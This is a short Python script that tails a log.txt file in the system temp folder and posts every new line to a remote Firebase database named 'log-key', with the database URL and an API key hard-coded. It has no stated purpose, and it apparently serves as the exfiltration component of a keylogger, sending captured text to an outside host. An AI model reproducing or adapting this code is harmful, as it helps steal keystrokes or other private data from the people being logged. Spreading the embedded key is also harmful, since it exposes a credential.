import requests
import time
import os
import tempfile

# --- CONFIG ---
FIREBASE_URL = "https://log-key-cf44e-default-rtdb.europe-west1.firebasedatabase.app/logs.json"
API_KEY = "AIzaSyCKYpDCPJwYpq-o1KcUza1KP75zKbbH7es"

# --- Locate log.txt in the system temp folder ---
temp_dir = tempfile.gettempdir()
log_path = os.path.join(temp_dir, "log.txt")

print("Watching log file at:", log_path)

# --- Tail-like file follower ---
def follow(file):
    file.seek(0, os.SEEK_END)
    while True:
        line = file.readline()
        if not line:
            time.sleep(0.2)
            continue
        yield line.strip()

# --- Send line to Firebase ---
def send_to_firebase(text):
    data = {
        "entry": text,
        "timestamp": time.time()
    }
    requests.post(f"{FIREBASE_URL}?auth={API_KEY}", json=data)

# --- Main loop ---
while True:
    if os.path.exists(log_path):
        with open(log_path, "r") as logfile:
            for line in follow(logfile):
                print("Sending:", line)
                send_to_firebase(line)
    else:
        print("Waiting for log.txt to appear in temp folder...")
        time.sleep(1)
